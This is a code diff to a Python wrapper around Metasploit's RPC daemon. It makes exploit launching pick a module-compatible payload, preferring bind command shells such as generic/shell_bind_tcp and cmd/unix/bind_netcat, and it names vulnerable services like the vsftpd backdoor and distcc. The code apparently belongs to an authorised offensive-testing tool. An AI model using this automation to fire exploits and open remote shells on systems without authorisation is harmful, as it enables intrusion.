@@ -209,6 +209,60 @@ class MsfRpc:
             time.sleep(0.6)
         return {"code": "unknown", "detail": "check timed out"}
 
+    def _compatible_payloads(self, module: str) -> List[str]:
+        """Payloads THIS exploit module accepts, per msfrpcd. `module.compatible_payloads` takes the FULL
+        'exploit/...' name as a SINGLE arg on this build (a 2-arg mtype+ref call errors). Returns [] when the
+        call is unavailable — the caller then keeps its hint / the module default. Never raises."""
+        try:
+            r = self._call("module.compatible_payloads", module)
+            pls = r.get("payloads") if isinstance(r, dict) else r
+            return [str(p) for p in (pls or [])]
+        except Exception:
+            return []
+
+    @staticmethod
+    def _select_payload(compatible: List[str], hint: Optional[str] = None,
+                        reverse_ok: bool = False) -> Optional[str]:
+        """Pick a MODULE-COMPATIBLE payload, preferring a BIND / no-callback command shell (the VPN'd droplet
+        has no route for a reverse callback). Skips target-ALTERING payloads (adduser/chmod/useradd) and
+        file-fetch stagers (download / …/exec). Reverse is chosen only when reverse_ok (AVA_MSF_LHOST set) and
+        no bind shell is compatible. Returns None on an empty list -> caller keeps its hint / the module
+        default. ponytail: heuristic name-matching over msf's payload taxonomy; a full ranking (meterpreter >
+        shell, arch match) is the upgrade if a target ever needs it."""
+        if not compatible:
+            return None
+        pairs = [(p, p.lower()) for p in compatible]
+        altering = ("adduser", "useradd", "chmod", "download", "/exec")
+        pool = [(p, pl) for p, pl in pairs if not any(a in pl for a in altering)] or pairs
+        # 1) well-known bind command shells, most reliable first
+        for pref in ("generic/shell_bind_tcp", "cmd/unix/bind_perl", "cmd/unix/bind_ruby",
+                     "cmd/unix/bind_netcat", "cmd/unix/bind_netcat_gaping"):
+            for p, pl in pool:
+                if pl == pref:
+                    return p
+        # 2) any compatible BIND shell/meterpreter
+        for p, pl in pool:
+            if "bind" in pl and ("shell" in pl or "cmd/unix" in pl or "meterpreter" in pl):
+                return p
+        for p, pl in pool:
+            if "bind" in pl:
+                return p
+        # 3) reverse — only when a callback route exists
+        if reverse_ok:
+            for p, pl in pool:
+                if "reverse" in pl and ("shell" in pl or "cmd/unix" in pl or "meterpreter" in pl):
+                    return p
+            for p, pl in pool:
+                if "reverse" in pl:
+                    return p
+        # 4) honor a compatible hint, else the first NON-reverse safe payload (never a reverse w/o a route)
+        if hint and hint in compatible:
+            return hint
+        for p, pl in pool:
+            if "reverse" not in pl:
+                return p
+        return None
+
     def run_exploit(
         self,
         module: str,
@@ -224,18 +278,28 @@ class MsfRpc:
         opts: Dict[str, Any] = {"RHOSTS": rhost}
         if rport:
             opts["RPORT"] = rport
-        # Sensible default payload only for exploit modules.
+        # PAYLOAD selection (exploit modules only). The old code forced ONE payload
+        # (generic/shell_reverse_tcp or a passed hint) regardless of whether the module accepts it — so a
+        # module whose only compatible payloads are cmd/unix/bind_* (vsftpd backdoor, distcc, UnrealIRCd)
+        # silently failed to launch (module.execute -> job_id None -> "no session opened"). Now we ask msfrpcd
+        # which payloads THIS module accepts and pick a compatible one, preferring a BIND / no-callback shell
+        # (a reverse payload needs a routable LHOST back to the VPN'd droplet, usually absent). Reverse is used
+        # only when AVA_MSF_LHOST is set AND no bind shell is compatible.
         if mtype == "exploit":
-            opts["PAYLOAD"] = payload or "generic/shell_reverse_tcp"
-            # A reverse payload must call back to US. On the prod VM (behind VPN) that is the droplet's
-            # VPN-facing IP — not guessable — so set AVA_MSF_LHOST (+ optional AVA_MSF_LPORT) for an
-            # approved fire to open a session. Unset -> msf's own default (fine on a flat dev LAN).
             _lhost = os.getenv("AVA_MSF_LHOST")
-            if _lhost:
-                opts["LHOST"] = _lhost
-            _lport = os.getenv("AVA_MSF_LPORT")
-            if _lport:
-                opts["LPORT"] = _lport
+            chosen = self._select_payload(self._compatible_payloads(module),
+                                          hint=payload, reverse_ok=bool(_lhost))
+            if chosen:
+                opts["PAYLOAD"] = chosen
+            elif payload:
+                opts["PAYLOAD"] = payload       # last resort: caller hint (may still fail — honestly)
+            # else: omit PAYLOAD -> msf uses the module's own default
+            if chosen and "reverse" in chosen.lower():
+                if _lhost:
+                    opts["LHOST"] = _lhost
+                _lport = os.getenv("AVA_MSF_LPORT")
+                if _lport:
+                    opts["LPORT"] = _lport
         if options:
             opts.update(options)
         try:
